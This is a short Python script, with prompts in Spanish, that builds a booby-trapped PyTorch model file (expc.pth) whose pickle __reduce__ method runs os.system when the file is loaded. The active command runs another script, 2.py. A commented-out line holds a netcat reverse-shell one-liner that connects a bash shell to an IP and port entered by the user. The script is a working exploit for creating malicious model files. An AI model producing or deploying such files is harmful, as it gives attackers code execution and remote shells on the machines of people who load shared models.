import torch
import torch.nn as nn
import os


IPs     = input("Ingresa tu IP ")
PORTs   = input("Ingresa el puerto ")

class MaliciousModel(nn.Module):
    def __init__(self):
        super(MaliciousModel, self).__init__()
        self.dense = nn.Linear(10, 1)

    def forward(self, demo):
        return self.dense(demo)

    def __reduce__(self):
        #cmd = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc "+IPs+" " + PORTs
        cmd = 'python3 2.py'
        return os.system, (cmd,)

maliiosu_model = MaliciousModel()

torch.save(maliiosu_model, "expc.pth")
